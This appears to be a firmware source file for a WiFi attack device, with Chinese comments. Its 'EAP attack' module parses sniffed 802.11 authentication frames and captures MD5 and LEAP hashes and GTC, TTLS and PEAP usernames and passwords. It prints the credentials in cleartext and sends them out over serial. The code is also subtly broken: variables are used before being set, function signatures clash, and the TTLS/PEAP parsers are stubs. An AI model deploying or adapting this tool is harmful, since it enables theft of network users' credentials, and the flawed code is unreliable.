#include "wifi_eap_attack.h"
#include "wifi_frame_parser.h"
#include "error_handler.h"
#include "debug.h"

// 全局变量定义
EAPAttackSession eap_attack_sessions[MAX_EAP_SESSIONS];
uint8_t eap_session_count = 0;
bool eap_attack_enabled = false;
EAPAttackType current_attack_type = EAP_ATTACK_UNKNOWN;
uint32_t eap_attack_timeout = 300000; // 5分钟超时

// 初始化EAP攻击系统
void init_eap_attack() {
    memset(eap_attack_sessions, 0, sizeof(eap_attack_sessions));
    eap_session_count = 0;
    eap_attack_enabled = false;
    current_attack_type = EAP_ATTACK_UNKNOWN;
    DEBUG_SER_PRINT("EAP attack system initialized\n");
}

// 启用EAP攻击
void enable_eap_attack(EAPAttackType type) {
    eap_attack_enabled = true;
    current_attack_type = type;
    DEBUG_SER_PRINT("EAP attack enabled: %s\n", eap_type_to_string(type).c_str());
}

// 禁用EAP攻击
void disable_eap_attack() {
    eap_attack_enabled = false;
    current_attack_type = EAP_ATTACK_UNKNOWN;
    DEBUG_SER_PRINT("EAP attack disabled\n");
}

// 检查EAP攻击是否启用
bool is_eap_attack_enabled() {
    return eap_attack_enabled;
}

// 获取当前攻击类型
EAPAttackType get_current_attack_type() {
    return current_attack_type;
}

// 处理EAP数据包
bool process_eap_packet(const uint8_t* packet, size_t length, uint8_t* src_mac, uint8_t* dst_mac) {
    // 参数验证
    CHECK_PARAM(eap_attack_enabled, ERROR_OPERATION_FAILED, "EAP attack not enabled");
    CHECK_PARAM(validate_packet(packet, length), ERROR_INVALID_PARAMETER, "Invalid packet");
    CHECK_PARAM(validate_mac_address(src_mac), ERROR_INVALID_DATA, "Invalid source MAC");
    CHECK_PARAM(validate_mac_address(dst_mac), ERROR_INVALID_DATA, "Invalid destination MAC");
    
    // 检查系统资源
    CHECK_MEMORY(sizeof(EAPAttackSession) + sizeof(EAPPacket));
    
    // 设置操作超时
    static uint32_t operation_id = 1;
    if (!error_handler.set_operation_timeout(operation_id, TIMEOUT_DEFAULT)) {
        error_handler.log_error(ERROR_OPERATION_FAILED, "Failed to set operation timeout");
        return false;
    }

    // 使用新的帧解析器检查是否为EAP数据包
    if (!is_eap_frame(packet, length)) {
        error_handler.clear_operation_timeout(operation_id);
        return false;
    }

    DEBUG_SER_PRINT("EAP packet detected\n");

    // 解析802.11帧
    WiFiFrameInfo frame_info;
    if (!parse_wifi_frame(packet, length, &frame_info)) {
        error_handler.log_error(ERROR_INVALID_DATA, "Failed to parse WiFi frame");
        error_handler.clear_operation_timeout(operation_id);
        return false;
    }

    // 检查超时
    CHECK_TIMEOUT(operation_id);

    // 提取MAC地址
    uint8_t ap_mac[6], client_mac[6], bssid[6];
    extract_mac_addresses(packet, length, src_mac, dst_mac, bssid);
    
    // 验证提取的MAC地址
    if (!validate_mac_address(ap_mac) || !validate_mac_address(client_mac)) {
        error_handler.log_error(ERROR_INVALID_DATA, "Invalid extracted MAC addresses");
        error_handler.clear_operation_timeout(operation_id);
        return false;
    }
    
    // 根据帧方向确定AP和客户端
    if (frame_info.from_ds && !frame_info.to_ds) {
        // AP到客户端
        memcpy(ap_mac, src_mac, 6);
        memcpy(client_mac, dst_mac, 6);
    } else if (!frame_info.from_ds && frame_info.to_ds) {
        // 客户端到AP
        memcpy(ap_mac, dst_mac, 6);
        memcpy(client_mac, src_mac, 6);
    } else {
        // 其他情况，使用BSSID作为AP地址
        memcpy(ap_mac, bssid, 6);
        memcpy(client_mac, src_mac, 6);
    }

    // 检查超时
    CHECK_TIMEOUT(operation_id);

    // 解析EAP数据包
    EAPPacket eap_packet;
    if (!parse_eap_packet(packet, length, &eap_packet)) {
        error_handler.log_error(ERROR_INVALID_DATA, "Failed to parse EAP packet");
        error_handler.clear_operation_timeout(operation_id);
        return false;
    }

    // 检查超时
    CHECK_TIMEOUT(operation_id);

    // 查找或创建会话
    EAPAttackSession* session = find_or_create_eap_session(ap_mac, client_mac, current_attack_type);
    if (!session) {
        error_handler.log_error(ERROR_RESOURCE_EXHAUSTED, "Failed to create EAP attack session");
        error_handler.clear_operation_timeout(operation_id);
        return false;
    }

    // 更新会话
    if (update_eap_session(session, &eap_packet)) {
        DEBUG_SER_PRINT("EAP packet processed successfully\n");
        error_handler.clear_operation_timeout(operation_id);
        return true;
    }

    error_handler.log_error(ERROR_OPERATION_FAILED, "Failed to update EAP session");
    error_handler.clear_operation_timeout(operation_id);
    return false;
}

// 检查是否为EAP数据包（保留向后兼容）
bool is_eap_packet(const uint8_t* packet, size_t length) {
    return is_eap_frame(packet, length);
}

// 解析EAP数据包
bool parse_eap_packet(const uint8_t* packet, size_t length, EAPPacket* eap_packet) {
    // 参数验证
    CHECK_PARAM(validate_packet(packet, length), ERROR_INVALID_PARAMETER, "Invalid packet");
    CHECK_PARAM(eap_packet != nullptr, ERROR_INVALID_PARAMETER, "EAP packet is null");
    
    // 检查最小长度
    if (length < WIFI_FRAME_MIN_LENGTH) {
        error_handler.log_error(ERROR_INVALID_DATA, "Packet too short for WiFi frame");
        return false;
    }

    memset(eap_packet, 0, sizeof(EAPPacket));
    eap_packet->timestamp = millis();

    // 解析802.11帧
    WiFiFrameInfo frame_info;
    if (!parse_wifi_frame(packet, length, &frame_info)) {
        error_handler.log_error(ERROR_INVALID_DATA, "Failed to parse WiFi frame");
        return false;
    }

    // 检查载荷长度
    if (frame_info.payload_length < 8) {
        error_handler.log_error(ERROR_INVALID_DATA, "EAPOL payload too short");
        return false;
    }

    const uint8_t* eapol_data = frame_info.payload;
    
    // 跳过EAPOL头部 (2字节EtherType + 2字节EAPOL头部)
    const uint8_t* eap_data = eapol_data + 4;
    size_t eap_length = frame_info.payload_length - 4;

    if (eap_length < 4) {
        error_handler.log_error(ERROR_INVALID_DATA, "EAP data too short");
        return false;
    }

    // 解析EAP头部
    eap_packet->code = eap_data[0];
    eap_packet->identifier = eap_data[1];
    eap_packet->length = (eap_data[2] << 8) | eap_data[3];

    // 检查长度是否有效
    if (eap_packet->length < 4) {
        error_handler.log_error(ERROR_INVALID_DATA, "EAP packet length too short");
        return false;
    }
    
    if (eap_packet->length > eap_length) {
        error_handler.log_error(ERROR_BUFFER_OVERFLOW, "EAP packet length exceeds available data");
        return false;
    }
    
    if (eap_packet->length > EAP_MAX_PACKET_SIZE) {
        error_handler.log_error(ERROR_BUFFER_OVERFLOW, "EAP packet length exceeds maximum size");
        return false;
    }

    // 解析EAP类型（如果有）
    if (eap_packet->length > 4) {
        eap_packet->type = eap_data[4];
        
        // 提取数据部分
        size_t data_len = eap_packet->length - 5; // 减去头部5字节
        if (data_len > 0) {
            if (data_len <= EAP_MAX_PACKET_SIZE) {
                memcpy(eap_packet->data, eap_data + 5, data_len);
                eap_packet->data_length = data_len;
            } else {
                error_handler.log_error(ERROR_BUFFER_OVERFLOW, "EAP data too large");
                return false;
            }
        }
    }

    // 验证EAP包的有效性
    if (!validate_eap_packet(eap_packet)) {
        error_handler.log_error(ERROR_INVALID_DATA, "EAP packet validation failed");
        return false;
    }

    eap_packet->is_valid = true;
    return true;
}

// 验证EAP包的有效性
bool validate_eap_packet(const EAPPacket* eap_packet) {
    if (!eap_packet) {
        return false;
    }
    
    // 检查EAP代码
    if (eap_packet->code < 1 || eap_packet->code > 4) {
        char error_msg[64];
        snprintf(error_msg, sizeof(error_msg), "Invalid EAP code: %d", eap_packet->code);
        error_handler.log_error(ERROR_INVALID_DATA, error_msg);
        return false;
    }
    
    // 检查EAP长度
    if (eap_packet->length < 4) {
        char error_msg[64];
        snprintf(error_msg, sizeof(error_msg), "EAP length too short: %d", eap_packet->length);
        error_handler.log_error(ERROR_INVALID_DATA, error_msg);
        return false;
    }
    
    // 检查数据长度
    if (eap_packet->data_length > EAP_MAX_PACKET_SIZE) {
        char error_msg[64];
        snprintf(error_msg, sizeof(error_msg), "EAP data too large: %d", eap_packet->data_length);
        error_handler.log_error(ERROR_BUFFER_OVERFLOW, error_msg);
        return false;
    }
    
    // 检查时间戳是否合理
    uint32_t current_time = millis();
    if (eap_packet->timestamp > current_time || 
        (current_time - eap_packet->timestamp) > 300000) { // 5分钟
        error_handler.log_error(ERROR_INVALID_DATA, "Invalid EAP timestamp");
        return false;
    }
    
    return true;
}

// 查找或创建EAP攻击会话
EAPAttackSession* find_or_create_eap_session(uint8_t* ap_mac, uint8_t* client_mac, EAPAttackType type) {
    // 参数验证
    CHECK_PARAM(validate_mac_address(ap_mac), ERROR_INVALID_DATA, "Invalid AP MAC address");
    CHECK_PARAM(validate_mac_address(client_mac), ERROR_INVALID_DATA, "Invalid client MAC address");
    CHECK_PARAM(type != EAP_ATTACK_UNKNOWN, ERROR_INVALID_PARAMETER, "Unknown attack type");
    
    // 检查系统资源
    CHECK_MEMORY(sizeof(EAPAttackSession));
    
    // 检查会话数量限制
    if (eap_session_count >= MAX_SESSIONS) {
        error_handler.log_error(ERROR_RESOURCE_EXHAUSTED, "Maximum sessions reached");
        return nullptr;
    }
    
    // 查找现有会话
    for (uint8_t i = 0; i < eap_session_count; i++) {
        EAPAttackSession* session = &eap_attack_sessions[i];
        if (memcmp(session->ap_mac, ap_mac, 6) == 0 && 
            memcmp(session->client_mac, client_mac, 6) == 0 &&
            session->attack_type == type) {
            // 更新最后访问时间
            session->last_update = millis();
            return session;
        }
    }

    // 创建新会话
    EAPAttackSession* new_session = &eap_attack_sessions[eap_session_count];
    memset(new_session, 0, sizeof(EAPAttackSession));
    memcpy(new_session->ap_mac, ap_mac, 6);
    memcpy(new_session->client_mac, client_mac, 6);
    new_session->attack_type = type;
    new_session->start_time = millis();
    new_session->last_update = millis();
    new_session->is_active = 1;
    new_session->is_captured = 0;
    new_session->identifier = 0;

    // 分配内存
    if (!error_handler.check_resources(sizeof(EAPAttackSession))) {
        error_handler.log_error(ERROR_MEMORY_ALLOCATION, "Failed to allocate memory for new session");
        return nullptr;
    }

    eap_session_count++;
    
    // 更新系统状态
    error_handler.update_system_status();
    
    DEBUG_SER_PRINT("Created new EAP attack session\n");
    return new_session;
}

// 更新EAP会话
bool update_eap_session(EAPAttackSession* session, const EAPPacket* eap_packet) {
    // 参数验证
    CHECK_PARAM(session != nullptr, ERROR_INVALID_PARAMETER, "Session is null");
    CHECK_PARAM(eap_packet != nullptr, ERROR_INVALID_PARAMETER, "EAP packet is null");
    CHECK_PARAM(eap_packet->is_valid, ERROR_INVALID_DATA, "EAP packet is invalid");
    
    // 检查会话是否过期
    uint32_t current_time = millis();
    if (current_time - session->last_update > eap_attack_timeout) {
        error_handler.log_error(ERROR_TIMEOUT, "Session expired");
        session->is_active = false;
        return false;
    }

    session->last_update = current_time;
    session->identifier = eap_packet->identifier;

    // 根据攻击类型处理数据包
    bool handled = false;
    switch (session->attack_type) {
        case EAP_ATTACK_MD5:
            handled = handle_eap_md5(session, eap_packet);
            break;
        case EAP_ATTACK_LEAP:
            handled = handle_eap_leap(session, eap_packet);
            break;
        case EAP_ATTACK_GTC:
            handled = handle_eap_gtc(session, eap_packet);
            break;
        case EAP_ATTACK_TTLS:
            handled = handle_eap_ttls(session, eap_packet);
            break;
        case EAP_ATTACK_PEAP:
            handled = handle_eap_peap(session, eap_packet);
            break;
        default:
            char error_msg[64];
            snprintf(error_msg, sizeof(error_msg), "Unknown attack type: %d", session->attack_type);
            error_handler.log_error(ERROR_INVALID_PARAMETER, error_msg);
            return false;
    }
    
    if (!handled) {
        error_handler.log_error(ERROR_OPERATION_FAILED, "Failed to handle EAP packet");
    }

    if (handled && session->is_captured) {
        DEBUG_SER_PRINT("EAP credentials captured!\n");
        export_eap_data(session);
    }

    return handled;
}

// 处理EAP-MD5攻击
bool handle_eap_md5(EAPAttackSession* session, const EAPPacket* eap_packet) {
    if (eap_packet->type != EAP_TYPE_MD5) {
        return false;
    }

    if (eap_packet->code == EAP_CODE_RESPONSE) {
        // 提取MD5哈希
        uint8_t hash[16];
        uint16_t hash_length;
        if (extract_md5_hash(eap_packet, hash, &hash_length)) {
            memcpy(session->hash_data, hash, hash_length);
            session->hash_length = hash_length;
            session->is_captured = true;
            
            DEBUG_SER_PRINT("MD5 hash captured: ");
            for (int i = 0; i < hash_length; i++) {
                DEBUG_SER_PRINT("%02X", hash[i]);
            }
            DEBUG_SER_PRINT("\n");
            
            return true;
        }
    }

    return false;
}

// 处理EAP-LEAP攻击
bool handle_eap_leap(EAPAttackSession* session, const EAPPacket* eap_packet) {
    if (eap_packet->type != EAP_TYPE_LEAP) {
        return false;
    }

    if (eap_packet->code == EAP_CODE_RESPONSE) {
        // 提取LEAP哈希
        uint8_t hash[24];
        uint16_t hash_length;
        if (extract_leap_hash(eap_packet, hash, &hash_length)) {
            memcpy(session->hash_data, hash, hash_length);
            session->hash_length = hash_length;
            session->is_captured = true;
            
            DEBUG_SER_PRINT("LEAP hash captured: ");
            for (int i = 0; i < hash_length; i++) {
                DEBUG_SER_PRINT("%02X", hash[i]);
            }
            DEBUG_SER_PRINT("\n");
            
            return true;
        }
    }

    return false;
}

// 处理EAP-GTC攻击
bool handle_eap_gtc(EAPAttackSession* session, const EAPPacket* eap_packet) {
    if (eap_packet->type != EAP_TYPE_GTC) {
        return false;
    }

    if (eap_packet->code == EAP_CODE_RESPONSE) {
        // 提取GTC凭据
        char username[64], password[64];
        if (extract_gtc_credentials(eap_packet, username, password, sizeof(username))) {
            strncpy(session->username, username, sizeof(session->username) - 1);
            session->username[sizeof(session->username) - 1] = '\0';
            strncpy(session->password, password, sizeof(session->password) - 1);
            session->password[sizeof(session->password) - 1] = '\0';
            session->is_captured = true;
            
            DEBUG_SER_PRINT("GTC credentials captured: %s:%s\n", 
                           username, password);
            
            return true;
        }
    }

    return false;
}

// 处理EAP-TTLS攻击
bool handle_eap_ttls(EAPAttackSession* session, const EAPPacket* eap_packet) {
    if (eap_packet->type != EAP_TYPE_TTLS) {
        return false;
    }

    if (eap_packet->code == EAP_CODE_RESPONSE) {
        // 提取TTLS凭据
        String username, password;
        if (extract_ttls_credentials(eap_packet, &username, &password)) {
            session->username = username;
            session->password = password;
            session->is_captured = true;
            
            DEBUG_SER_PRINT("TTLS credentials captured: %s:%s\n", 
                           username.c_str(), password.c_str());
            
            return true;
        }
    }

    return false;
}

// 处理EAP-PEAP攻击
bool handle_eap_peap(EAPAttackSession* session, const EAPPacket* eap_packet) {
    if (eap_packet->type != EAP_TYPE_PEAP) {
        return false;
    }

    if (eap_packet->code == EAP_CODE_RESPONSE) {
        // 提取PEAP凭据
        String username, password;
        if (extract_peap_credentials(eap_packet, &username, &password)) {
            session->username = username;
            session->password = password;
            session->is_captured = true;
            
            DEBUG_SER_PRINT("PEAP credentials captured: %s:%s\n", 
                           username.c_str(), password.c_str());
            
            return true;
        }
    }

    return false;
}

// 提取MD5哈希
bool extract_md5_hash(const EAPPacket* eap_packet, uint8_t* hash, uint16_t* hash_length) {
    if (eap_packet->data_length < 16) {
        return false;
    }

    // MD5哈希在数据部分的前16字节
    memcpy(hash, eap_packet->data, 16);
    *hash_length = 16;
    return true;
}

// 提取LEAP哈希
bool extract_leap_hash(const EAPPacket* eap_packet, uint8_t* hash, uint16_t* hash_length) {
    if (eap_packet->data_length < 24) {
        return false;
    }

    // LEAP哈希在数据部分的前24字节
    memcpy(hash, eap_packet->data, 24);
    *hash_length = 24;
    return true;
}

// 提取GTC凭据
bool extract_gtc_credentials(const EAPPacket* eap_packet, String* username, String* password) {
    if (eap_packet->data_length < 2) {
        return false;
    }

    // GTC数据格式: [username_length][username][password_length][password]
    uint8_t username_len = eap_packet->data[0];
    if (username_len > 0 && username_len < eap_packet->data_length - 1) {
        *username = String((char*)(eap_packet->data + 1), username_len);
        
        uint8_t password_len = eap_packet->data[1 + username_len];
        if (password_len > 0 && (1 + username_len + 1 + password_len) <= eap_packet->data_length) {
            *password = String((char*)(eap_packet->data + 1 + username_len + 1), password_len);
            return true;
        }
    }

    return false;
}

// 提取TTLS凭据 
bool extract_ttls_credentials(const EAPPacket* eap_packet, String* username, String* password) {
    // TTLS凭据提取逻辑（简化实现）
    // 实际实现需要解析TTLS内部协议
    return extract_gtc_credentials(eap_packet, username, password);
}

// 提取PEAP凭据
bool extract_peap_credentials(const EAPPacket* eap_packet, String* username, String* password) {
    // PEAP凭据提取逻辑（简化实现）
    // 实际实现需要解析PEAP内部协议
    return extract_gtc_credentials(eap_packet, username, password);
}

// 导出EAP数据
void export_eap_data(const EAPAttackSession* session) {
    if (!session) {
        return;
    }

    String eap_data = format_eap_for_export(session);
    send_eap_data_via_uart(session);
    
    DEBUG_SER_PRINT("EAP data exported\n");
}

// 导出所有EAP数据
void export_all_eap_data() {
    for (uint8_t i = 0; i < eap_session_count; i++) {
        if (eap_attack_sessions[i].is_captured) {
            export_eap_data(&eap_attack_sessions[i]);
        }
    }
}

// 格式化EAP数据用于导出
void format_eap_for_export(const EAPAttackSession* session, char* buffer, size_t buffer_size) {
    if (!session || !buffer || buffer_size < 512) {
        return;
    }
    
    char ap_mac_str[18];
    char client_mac_str[18];
    char hash_str[129]; // 64 bytes * 2 + 1 for null terminator
    
    // 格式化AP MAC地址
    snprintf(ap_mac_str, sizeof(ap_mac_str), "%02X:%02X:%02X:%02X:%02X:%02X",
             session->ap_mac[0], session->ap_mac[1], session->ap_mac[2],
             session->ap_mac[3], session->ap_mac[4], session->ap_mac[5]);
    
    // 格式化客户端MAC地址
    snprintf(client_mac_str, sizeof(client_mac_str), "%02X:%02X:%02X:%02X:%02X:%02X",
             session->client_mac[0], session->client_mac[1], session->client_mac[2],
             session->client_mac[3], session->client_mac[4], session->client_mac[5]);
    
    // 格式化哈希数据
    hash_str[0] = '\0';
    if (session->is_captured && session->hash_length > 0) {
        for (int i = 0; i < session->hash_length && i < 64; i++) {
            char hex[4];
            snprintf(hex, sizeof(hex), "%02X", session->hash_data[i]);
            strcat(hash_str, hex);
            if (i < session->hash_length - 1) {
                strcat(hash_str, ":");
            }
        }
    }
    
    // 格式化输出
    if (session->is_captured) {
        snprintf(buffer, buffer_size, 
                 "EAP:TYPE:%s|AP:%s|CLIENT:%s|SSID:%s|CHANNEL:%d|CAPTURED:YES|USERNAME:%s|PASSWORD:%s|HASH:%s|TIME:%u\n",
                 eap_type_to_string(session->attack_type), ap_mac_str, client_mac_str,
                 session->ssid, session->channel, session->username, session->password,
                 hash_str, session->start_time);
    } else {
        snprintf(buffer, buffer_size,
                 "EAP:TYPE:%s|AP:%s|CLIENT:%s|SSID:%s|CHANNEL:%d|CAPTURED:NO|TIME:%u\n",
                 eap_type_to_string(session->attack_type), ap_mac_str, client_mac_str,
                 session->ssid, session->channel, session->start_time);
    }
}

// 通过UART发送EAP数据
void send_eap_data_via_uart(const EAPAttackSession* session) {
    char buffer[512];
    format_eap_for_export(session, buffer, sizeof(buffer));
    Serial1.print(buffer);
    Serial.print(buffer);
}

// 清理过期会话
void cleanup_old_eap_sessions() {
    uint32_t current_time = millis();
    uint32_t cleaned_count = 0;
    
    for (uint8_t i = 0; i < eap_session_count; i++) {
        if (current_time - eap_attack_sessions[i].last_update > eap_attack_timeout) {
            DEBUG_SER_PRINT("Cleaning up expired EAP session\n");
            // 将最后一个会话移动到当前位置
            if (i < eap_session_count - 1) {
                memcpy(&eap_attack_sessions[i], &eap_attack_sessions[eap_session_count - 1], sizeof(EAPAttackSession));
            }
            eap_session_count--;
            cleaned_count++;
            i--; // 重新检查当前位置
        }
    }
    
    if (cleaned_count > 0) {
        DEBUG_SER_PRINT("Cleaned up %d expired EAP sessions\n", cleaned_count);
        error_handler.update_system_status();
    }
    
    // 检查系统健康状态
    if (!error_handler.is_system_healthy()) {
        DEBUG_SER_PRINT("System unhealthy, performing emergency cleanup\n");
        emergency_cleanup_eap_sessions();
    }
}

// 紧急清理函数
void emergency_cleanup_eap_sessions() {
    // 清理所有非活跃会话
    for (uint8_t i = 0; i < eap_session_count; i++) {
        if (!eap_attack_sessions[i].is_active) {
            // 将最后一个会话移动到当前位置
            if (i < eap_session_count - 1) {
                memcpy(&eap_attack_sessions[i], &eap_attack_sessions[eap_session_count - 1], sizeof(EAPAttackSession));
            }
            eap_session_count--;
            i--; // 重新检查当前位置
        }
    }
    
    // 如果仍然太多，清理最旧的会话
    while (eap_session_count > MAX_SESSIONS / 2) {
        uint8_t oldest_index = 0;
        for (uint8_t i = 1; i < eap_session_count; i++) {
            if (eap_attack_sessions[i].last_update < eap_attack_sessions[oldest_index].last_update) {
                oldest_index = i;
            }
        }
        // 将最后一个会话移动到最旧的位置
        if (oldest_index < eap_session_count - 1) {
            memcpy(&eap_attack_sessions[oldest_index], &eap_attack_sessions[eap_session_count - 1], sizeof(EAPAttackSession));
        }
        eap_session_count--;
    }
    
    error_handler.cleanup_old_resources();
    DEBUG_SER_PRINT("Emergency cleanup completed\n");
}

// 清除所有EAP数据
void clear_all_eap_data() {
    memset(eap_attack_sessions, 0, sizeof(eap_attack_sessions));
    eap_session_count = 0;
    error_handler.cleanup_old_resources();
    DEBUG_SER_PRINT("All EAP data cleared\n");
}

// 系统状态监控
void monitor_eap_system_health() {
    static uint32_t last_check = 0;
    uint32_t current_time = millis();
    
    // 每30秒检查一次系统健康状态
    if (current_time - last_check > 30000) {
        last_check = current_time;
        
        // 更新系统状态
        error_handler.update_system_status();
        
        // 检查系统是否健康
        if (!error_handler.is_system_healthy()) {
            DEBUG_SER_PRINT("System health check failed, performing cleanup\n");
            emergency_cleanup_eap_sessions();
        }
        
        // 打印系统状态
        print_eap_system_status();
    }
}

// 打印系统状态
void print_eap_system_status() {
    SystemStatus status = error_handler.get_system_status();
    
    DEBUG_SER_PRINT("=== EAP System Status ===\n");
    DEBUG_SER_PRINT("Active Sessions: %d\n", eap_session_count);
    DEBUG_SER_PRINT("Memory Usage: %d bytes\n", status.memory_usage);
    DEBUG_SER_PRINT("Error Count: %d\n", status.error_count);
    DEBUG_SER_PRINT("System Healthy: %s\n", error_handler.is_system_healthy() ? "Yes" : "No");
    DEBUG_SER_PRINT("========================\n");
}

// 获取EAP会话数量
uint32_t get_eap_session_count() {
    return eap_session_count;
}

// 获取活跃EAP会话数量
uint32_t get_active_eap_sessions() {
    uint32_t count = 0;
    for (uint8_t i = 0; i < eap_session_count; i++) {
        if (eap_attack_sessions[i].is_active) {
            count++;
        }
    }
    return count;
}

// 获取已捕获EAP会话数量
uint32_t get_captured_eap_sessions() {
    uint32_t count = 0;
    for (uint8_t i = 0; i < eap_session_count; i++) {
        if (eap_attack_sessions[i].is_captured) {
            count++;
        }
    }
    return count;
}

// EAP类型转换为字符串
const char* eap_type_to_string(EAPAttackType type) {
    switch (type) {
        case EAP_ATTACK_MD5: return "MD5";
        case EAP_ATTACK_LEAP: return "LEAP";
        case EAP_ATTACK_GTC: return "GTC";
        case EAP_ATTACK_TTLS: return "TTLS";
        case EAP_ATTACK_PEAP: return "PEAP";
        default: return "UNKNOWN";
    }
}

// 字符串转换为EAP类型
EAPAttackType string_to_eap_type(const char* type_str) {
    if (strcmp(type_str, "MD5") == 0) return EAP_ATTACK_MD5;
    if (strcmp(type_str, "LEAP") == 0) return EAP_ATTACK_LEAP;
    if (strcmp(type_str, "GTC") == 0) return EAP_ATTACK_GTC;
    if (strcmp(type_str, "TTLS") == 0) return EAP_ATTACK_TTLS;
    if (strcmp(type_str, "PEAP") == 0) return EAP_ATTACK_PEAP;
    return EAP_ATTACK_UNKNOWN;
}

// 检查EAP攻击类型是否支持
bool is_eap_attack_type_supported(EAPAttackType type) {
    return (type >= EAP_ATTACK_MD5 && type <= EAP_ATTACK_PEAP);
}

// 生成EAP挑战
void generate_eap_challenge(uint8_t* challenge, uint16_t length) {
    for (uint16_t i = 0; i < length; i++) {
        challenge[i] = random(256);
    }
}

